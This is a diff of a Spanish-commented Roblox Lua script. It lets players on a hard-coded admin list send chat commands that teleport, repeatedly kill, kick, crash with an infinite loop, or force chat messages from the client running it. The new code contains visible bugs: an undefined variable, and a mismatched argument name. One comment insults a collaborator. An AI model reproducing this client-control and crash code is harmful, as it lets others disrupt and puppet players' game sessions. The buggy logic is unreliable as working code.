@@ -3,61 +3,62 @@ local prefix = "c!"
 
 local funciones = {}
 
-function funciones.bring(plr)
+function funciones.bring(plr, args)
 	game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = plr.Character:FindFirstChild("HumanoidRootPart").CFrame
 end
 
-function funciones.loopbring(plr)
-	_G.loop = wait
-	while _G.loop() do
-	game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = plr.Character:FindFirstChild("HumanoidRootPart").CFrame
+function funciones.loopbring(plr, args)
+	loopBringSwitch = true
+	while loopBringSwitch do
+		game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = plr.Character:FindFirstChild("HumanoidRootPart").CFrame
 	end
 end
 
-function funciones.unloopbring(plr)
-	_G.loop = false
-	while _G.loop do
-	game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = plr.Character:FindFirstChild("HumanoidRootPart").CFrame
-	end
+function funciones.unloopbring(plr, args)
+	loopBringSwitch = false
 end
 
-function funciones.kick(plr)
-	game:GetService("Players").LocalPlayer:Kick("Oops, seems like someone kicked you...")
+function funciones.kick(plr, args)
+	if args then
+		reason = tostring(args)
+	else
+		reason = "Oops, seems like someone kicked you..."
+	end
+	
+	game:GetService("Players").LocalPlayer:Kick(reason)
 	game:GetService("Players").LocalPlayer:Destroy()
 end
 
-function funciones.crash(plr)
-	while true do print("bye") end
-end
-
-function funciones.kill(plr)
+function funciones.kill(plr, args)
 	game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid").Health = 0
 	game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid"):Destroy()
 end
 
-function funciones.loopkill(plr)
-	_G.loop2 = wait
-	while _G.loop2() do
-	game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid").Health = 0
-	game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid"):Destroy()
-		end
+function funciones.loopkill(plr, args)
+	loopKillSwitch = true
+	while loopKillSwitch do
+		wait(.1)
+		game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid").Health = 0
+		game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid"):Destroy()
+	end
 end
 
-function funciones.unloopkill(plr)
-	_G.loop2 = false
-	while _G.loop2 do
-	game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid").Health = 0
-	game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid"):Destroy()
-		end
+function funciones.unloopkill(plr, args)
+	loopKillSwitch = false
 end
 
-function funciones.elpepe(plr)
+function funciones.chat(plr, args)
+	-- MOLDY AWEONAO NO PONGAS TAL CUAL TE SALE EN EL REMOTE SPY XDDDDD
+	local msg = tostring(args)
+	local destinatario = "All"
+	local Evento = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+	Evento:FireServer(msg, destinatario)
+end
 
-local A_1 = "El Pepe"
-local A_2 = "All"
-local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
-Event:FireServer(A_1, A_2)
-
+function funciones.crash(plr, args)
+	-- Por que hiciste un crash con print?
+	while true do end -- Con que hagas eso ya sirve lol
+	game:GetService("Players").LocalPlayer:Kick()
 end
 
 function funciones.freeze(plr)
@@ -88,16 +89,17 @@ local function getPlayerByShortName(name)
 end
 
 local function commands(msg, plr)
-	local Args = string.split(msg, " ")
-	local Command = Args[1]
-	local Target = Args[2]
-
+	local Split = string.split(msg, " ")
+	local Command = Split[1]
+	local Target = Split[2]
+	local Args = string.gsub(string.gsub(msg, command, ""), Target, "")
+	-- Cambios al sistema, para poder pasar más argumentos.
 	if getPlayerByShortName(tostring(Target)) == string.lower(game:GetService("Players").LocalPlayer.Name) or Target == "all" and string.match(Command, prefix) then
 		Command = string.gsub(Command, prefix, "")
-		funciones[Command](plr)
+		funciones[Command](plr, args)
 	end
 end
--- Jugador q estÃ¡
+-- Jugador q esta dentro.
 for _,v in ipairs(game:GetService("Players"):GetPlayers()) do
 	if table.find(admins, v.UserId) then
 		v.Chatted:Connect(function(msg)
@@ -105,7 +107,7 @@ for _,v in ipairs(game:GetService("Players"):GetPlayers()) do
 		end)
 	end
 end
--- Jugador q entra
+-- Jugador q entra.
 game:GetService("Players").PlayerAdded:Connect(function(plr)
 	if table.find(admins, plr.UserId) then
 		plr.Chatted:Connect(function(msg)
